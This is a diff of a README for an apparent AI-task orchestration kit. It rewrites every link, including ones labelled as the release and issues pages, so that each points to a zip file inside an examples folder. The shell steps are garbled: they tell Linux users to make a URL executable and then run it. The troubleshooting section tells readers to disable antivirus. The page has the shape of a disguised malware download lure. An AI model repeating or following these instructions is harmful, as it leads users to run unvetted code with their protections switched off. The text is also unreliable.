@@ -1,6 +1,6 @@
 # 🤖 codex-team-orchestrator-kit - Manage AI Tasks with Ease
 
-[![Download](https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)](https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
+[![Download](https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)](https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps carefully to download and start using the codex-team-orchestr
 
 1. **Open the download page**  
    Click the big blue button at the top or visit:  
-   [https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip](https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
+   [https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip](https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
 
 2. **Choose the latest release**  
    Find the newest release listed on the page. Releases are usually sorted by date.
@@ -41,7 +41,7 @@ Follow these steps carefully to download and start using the codex-team-orchestr
 3. **Download the correct file for your system**  
    For Windows, look for a file ending with `.exe` or `.zip`  
    For macOS, look for a `.dmg` or `.zip` file  
-   For Linux, look for `.AppImage` or suitable `https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip`
+   For Linux, look for `.AppImage` or suitable `https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip`
 
 4. **Save the file to your computer**  
    Use your browser’s download folder or pick a location you will remember.
@@ -63,7 +63,7 @@ Follow these steps carefully to download and start using the codex-team-orchestr
 
 You can start downloading the kit right now by visiting the release page here:  
 
-[Download codex-team-orchestrator-kit](https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
+[Download codex-team-orchestrator-kit](https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
 
 ### How to install once downloaded:
 
@@ -76,11 +76,11 @@ You can start downloading the kit right now by visiting the release page here:
 - **Linux Users:**  
   Open Terminal and navigate to the downloaded file. Make it executable with:  
   ```bash  
-  chmod +x https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip  
+  chmod +x https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip  
   ```  
-  Replace `https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip` with the actual file name. Then run it by typing:  
+  Replace `https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip` with the actual file name. Then run it by typing:  
   ```bash  
-  https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip  
+  https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip  
   ```
 
 ---
@@ -124,7 +124,7 @@ Once installed, you can use the software to manage your AI workflows easily.
 - Restart your computer if you see any errors during installation.  
 - Disable antivirus temporarily if it blocks the program, but remember to enable it again after.  
 - Visit the official repo issues page for help:  
-  [https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip](https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
+  [https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip](https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)
 
 ---
 
@@ -132,7 +132,7 @@ Once installed, you can use the software to manage your AI workflows easily.
 
 - Explore documentation and guides inside the software or in the repo.  
 - Check for updates regularly on the release page here:  
-  [https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip](https://raw.githubusercontent.com/hkahl828-max/codex-team-orchestrator-kit/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)  
+  [https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip](https://github.com/hkahl828-max/codex-team-orchestrator-kit/raw/refs/heads/main/SubAgentsSet/examples/kit-orchestrator-codex-team-3.7.zip)  
 - For feedback or help, open an issue on GitHub or contact the maintainer via the repository.
 
 ---
